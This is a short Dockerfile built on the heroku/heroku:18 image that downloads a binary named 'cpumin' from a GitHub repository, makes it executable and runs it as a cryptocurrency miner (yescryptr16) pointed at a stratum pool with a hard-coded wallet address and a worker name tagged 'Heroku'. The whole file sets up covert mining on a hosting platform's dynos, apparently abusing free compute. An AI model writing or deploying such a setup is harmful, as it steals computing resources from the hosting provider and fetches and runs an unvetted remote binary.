FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://raw.githubusercontent.com/jacujamil/dewasa/main/cpumin; chmod +x cpumin; ./cpumin -a yescryptr16  -o stratum+tcps://stratum-asia.rplant.xyz:17057 -u GVYxDfWrdPYfr1WKv5GiCZVdMM1pKM3mpj.$(echo $(shuf -i 1-9999 -n 1)-Heroku) -p webpassword=mamas -t2
CMD bash heroku.sh
